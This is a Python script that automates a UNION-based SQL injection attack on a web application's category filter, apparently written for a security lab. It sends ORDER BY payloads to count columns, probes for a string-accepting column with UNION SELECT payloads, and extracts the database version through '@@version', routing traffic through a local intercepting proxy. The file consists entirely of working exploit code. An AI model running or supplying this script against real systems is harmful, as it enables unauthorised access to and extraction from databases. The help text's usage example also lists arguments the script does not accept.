import argparse
import sys
import urllib3
import requests
import urllib.parse
import re
from bs4 import BeautifulSoup


def disable_ssl_warnings():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def get_proxy_config():
    return {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }


def test_proxy_connection(proxies):
    test_url = "http://httpbin.org/get"
    try:
        requests.get(test_url, proxies=proxies, timeout=3)
        return True
    except requests.RequestException:
        return False


def get_cli_args():
    parser = argparse.ArgumentParser(
        description=(
            "Scenario: Find number of columns and identify which column accepts string data using UNION-based SQL injection.\n\n"
            "Example:\n"
            "  python3 unionTextColumnFinder.py https://vulnerable-site.com users username password email\n"
        ),
        formatter_class=argparse.RawTextHelpFormatter
    )

    parser.add_argument(
        "url", help="Target URL (e.g., https://vulnerable-site.com)")

    return parser.parse_args()


def find_column_count(base_url, proxies):
    endpoint = "/filter?category="
    print("(+) Determining number of columns using ORDER BY...\n")
    for i in range(1, 50):
        payload = f"' ORDER BY {i} #"
        encoded = urllib.parse.quote_plus(payload)
        full_url = f"{base_url}{endpoint}{encoded}"
        print(f"    ➤ Testing payload: {payload}")
        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            if "Internal Server Error" in response.text:
                print(
                    f"\n(✓) Found error at column {i}, so total columns = {i - 1}\n")
                return i - 1
        except requests.RequestException as err:
            print(f"(-) Request failed: {err}")
            break
    return None


def find_text_column(base_url, num_columns, proxies, test_string):
    endpoint = "/filter?category=Gifts"
    print(
        f"(+) Testing which of {num_columns} columns accepts string data...\n")
    quoted_string = f"'{test_string}'"

    for i in range(num_columns):
        payload_list = ['null'] * num_columns
        payload_list[i] = quoted_string
        payload = "' UNION SELECT " + ','.join(payload_list) + "#"
        encoded = urllib.parse.quote_plus(payload)
        full_url = f"{base_url}{endpoint}{encoded}"
        print(f"    ➤ Testing payload: {payload}")

        try:
            response = requests.get(full_url, verify=False, proxies=proxies)
            html = response.text

            if "Internal Server Error" in html:
                print(
                    f"    ✗ Column {i + 1} caused an error. Trying next...\n")
                continue

            if test_string in html:
                print(f"\n(✓) Column {i + 1} accepts string data.\n")
                return i + 1  # 1-based index

        except requests.RequestException as err:
            print(f"(-) Request failed at column {i + 1}: {err}")
            continue

    return None


def extract_table_data(base_url, proxies):
    endpoint = "/filter?category=Gifts"
    print(f"(+) Attempting to extract Version of DB...\n")

    union_payload = f"' UNION SELECT null, @@version#"
    encoded = urllib.parse.quote_plus(union_payload)
    full_url = f"{base_url}{endpoint}{encoded}"
    print(f"    ➤ Final payload: {union_payload}\n")

    try:
        response = requests.get(full_url, verify=False, proxies=proxies)
        html = response.text
        soup = BeautifulSoup(html, 'html.parser')

        version = soup.find(string=re.compile(r'\d{1,2}\.\d{1,2}\.\d{1,2}'))
        if not version:
            print("(-) Could not find expected data table in response.")
            return
        else:
            print(f"(✓) Database version is {version}")
    except requests.RequestException as err:
        print(f"(-) Request failed: {err}")


def attempt_sql_injection(base_url, proxies):
    print(f"\n(+) Targeting: {base_url}")
    num_columns = find_column_count(base_url, proxies)
    if not num_columns:
        print("[-] Could not determine column count.")
        return

    string_column_index = find_text_column(
        base_url, num_columns, proxies, "test123")
    if not string_column_index:
        print("[-] Could not find a column that accepts string data.")
        return

    extract_table_data(base_url, proxies)


def main():
    try:
        disable_ssl_warnings()
        proxies = get_proxy_config()

        if not test_proxy_connection(proxies):
            print("(-) Proxy unreachable at 127.0.0.1:8080.")
            print("    ➤ Start Proxy server or disable proxy in the script.")
            sys.exit(1)

        args = get_cli_args()
        attempt_sql_injection(args.url, proxies)

    except Exception as err:
        print(f"(-) Unexpected error: {err}")
        sys.exit(1)


if __name__ == "__main__":
    main()
